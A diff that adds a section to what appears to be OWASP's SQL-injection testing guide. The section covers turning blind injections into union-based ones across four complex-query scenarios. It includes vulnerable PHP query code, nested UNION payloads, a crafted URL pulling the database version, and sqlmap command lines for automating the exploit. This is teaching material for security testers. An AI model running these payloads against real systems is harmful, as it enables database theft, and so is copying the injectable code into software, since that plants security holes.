@@ -262,6 +262,231 @@ After the successful information gathering, depending on the application, it may
 
 `http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`
 
+#### Hidden Union Exploitation Technique
+
+It’s best when you can exploit a SQL injection with the [union technique](#union-exploitation-technique), because you can retrieve the result of your query in one request.  
+But most of the SQL injections in the wild are blind. Yet, you can turn some of them into union-based injections.
+
+**Identification**  
+Either of the following methods can be used to identify these SQL injections:
+
+1. The vulnerable query returns data, but the injection is blind.
+2. The `ORDER BY` technique works, but you can't achieve a union-based injection.
+
+**Root Cause**  
+The reason you can’t use the usual Union techniques is the complexity of the vulnerable query. In the Union Technique, you comment the rest of the query after your `UNION` payload. It's fine for normal queries, but in more complicated queries it can be problematic. If the first part of the query depends on the second part of it, commenting the rest of it breaks the original query.  
+
+**Scenario 1**  
+The vulnerable query is a sub-query, and the parent query handles returning the data.
+
+```text
+SELECT 
+  * 
+FROM 
+  customers 
+WHERE 
+  id IN (                 --\
+    SELECT                   |
+      DISTINCT customer_id   |
+    FROM                     |
+      orders                 |--> vulnerable query
+    WHERE                    |
+      cost > 200             |
+  );                      --/
+```
+
+- *Problem:* If you inject a `UNION` payload, it doesn't affect the returned data. Because you are modifying the `WHERE` section. In fact, you are not appending a `UNION` query to the original query.  
+- *Solution:* You need to know the query which gets executed in the back end. Then, create your payload based on that. It means closing open parentheses or adding proper keywords if needed.
+
+**Scenario 2**  
+The vulnerable query contains aliases or variable declarations.
+
+```text
+SELECT 
+  s1.user_id, 
+  (                                                                                      --\
+    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> vulnerable query
+  ) AS overlap                                                                           --/
+FROM 
+  subscriptions AS s1 
+  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
+  AND s1.start_date <= s2.end_date 
+  AND s1.end_date >= s2.start_date 
+GROUP BY 
+  s1.user_id
+```
+
+- *Problem:* You break the query when you comment the rest of the original query after your injected payload, because some aliases or variables become `undefined`.  
+- *Solution:* You need to put appropriate keywords or aliases at the beginning of your payload. this way the first part of the original query stays valid.
+
+**Scenario 3**  
+The result of the vulnerable query is being used in a second query. The second query returns the data, not the first one.
+
+```text
+<?php
+// retrieves product ID based on product name
+                            --\
+$query1 = "SELECT              |
+             id                |
+           FROM                |
+             products          |--> vulnerable query #1
+           WHERE               |
+             name = '$name'";  |
+                            --/
+$result1 = odbc_exec($conn, $query1);
+// retrieves product's comments based on the product ID
+                              --\
+$query2 = "SELECT                |
+             comments            |
+           FROM                  |
+             products            |--> vulnerable query #2
+           WHERE                 |
+             id = '$result1'";   |
+                              --/
+$result1 = odbc_exec($conn, $query2);
+?>
+```
+
+- *Problem:* You can add a `UNION` payload to the first query but it won't affect the returned data.  
+- *solution:* You need to inject in the second query. So the input to the second query should not get sanitized. Then, you need to make the first query return no data. Now append a `UNION` query that returns the payload you want to inject in the *second query*.  
+  
+  **Example:**  
+  The base of the payload (what you inject in the first query):
+
+  ```text
+  ' AND 1 = 2 UNION SELECT "PAYLOAD" -- -
+  ```
+
+  The `PAYLOAD` is what you want to inject in the *second query*:
+  
+  ```text
+  ' AND 1=2 UNION SELECT ...
+  ```
+
+  The final payload (after replacing the `PAYLOAD`):
+
+  ```text
+  ' AND 1 = 2 UNION SELECT "' AND 1=2 UNION SELECT ..." -- -
+                            \________________________/
+                                        ||
+                                        \/
+                                 the payload that
+                                  get's injected
+                               into the second query
+  \________________________________________________________/
+                              ||
+                              \/
+   the actual query we inject into the vulnerable parameter
+  ```
+
+  The first query after injection:
+
+  ```text
+  SELECT               --\
+    id                    |
+  FROM                    |----> first query
+    products              |
+  WHERE                   |
+    name = 'abcd'      --/
+    AND 1 = 2                                 --\
+  UNION                                          |----> injected payload (what gets injected into the second payload)
+  SELECT                                         |
+    "' AND 1=2 UNION SELECT ... -- -" -- -'   --/
+  ```
+
+  The second query after injection:
+
+  ```text
+  SELECT            --\
+    comments           |
+  FROM                 |----> second query
+    products           |
+  WHERE                |
+    id = ''         --/
+    AND 1 = 2         --\ 
+  UNION                  |----> injected payload (the final UNION query that controls the returned data)
+  SELECT ... -- -'    --/
+  ```
+
+**Scenario 4**  
+The vulnerable parameter is being used in several independent queries.
+
+```text
+<?php
+//retriveing product details based on product ID
+$query1 = "SELECT 
+             name, 
+             inserted, 
+             size 
+           FROM 
+             products 
+           WHERE 
+             id = '$id'";
+$result1 = odbc_exec($conn, $query1);
+//retriveing product's comments based on product ID
+$query2 = "SELECT 
+             comments 
+           FROM 
+             products 
+           WHERE 
+             id = '$id'";
+$result2 = odbc_exec($conn, $query2);
+?>
+```
+
+- *Problem:* Appending a `UNION` query to the first (or second) query doesn't break it, but it may break the other one.  
+- *Solution:* It depends on the code structure of the application. But the first step is to know the original query. Most of the time, these injections are time-based. Also, the time-based payload gets injected in several queries which can be problematic.  
+  For example, if you use `SQLMap`, this situation confuses the tool and the output gets messed up. Because the delays will not be as expected.  
+
+**Extracting Original Query**  
+As you see, knowing the original query is always needed to achieve a union-based injection.  
+You can retrieve the original query using the default DBMS tables:
+
+| DBMS                 | Table                          |
+|----------------------|--------------------------------|
+| MySQL                | INFORMATION_SCHEMA.PROCESSLIST |
+| PostgreSQL           | pg_stat_activity               |
+| Microsoft SQL Server | sys.dm_exec_cached_plans       |
+| Oracle               | V$SQL                          |
+
+**Automation**  
+Steps to automate the workflow:
+
+1. Extract the original query using `SQLMap` and blind injection.
+2. Build a base payload according to the original query and achieve union-based injection.
+3. Automate the exploitation of the union-based injection by one of these options:  
+    - Specifying a *custom injection point marker* (`*`)
+    - Using `--prefix` and `--suffix` flags.
+
+**Example:**  
+Consider the third scenario discussed above.  
+We assume the DMBS is `mysql` and the first and second queries return only one column.
+This can be your payload for extracting the version of the database:
+
+```text
+' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -
+```
+
+So the target URL would be like this:
+
+```text
+http://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
+```
+
+Automation:  
+
+- *custom injection point marker* (`*`):
+
+  ```text
+  sqlmap -u "http://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
+  ```
+
+- `--prefix` and `--suffix` flags:
+
+  ```text
+  sqlmap -u "http://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
+  ```
+
 #### Boolean Exploitation Technique
 
 The Boolean exploitation technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known on the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything on the structure of the query or on the database. (The page does not return a SQL error, it may just return a HTTP 500, 404, or redirect).
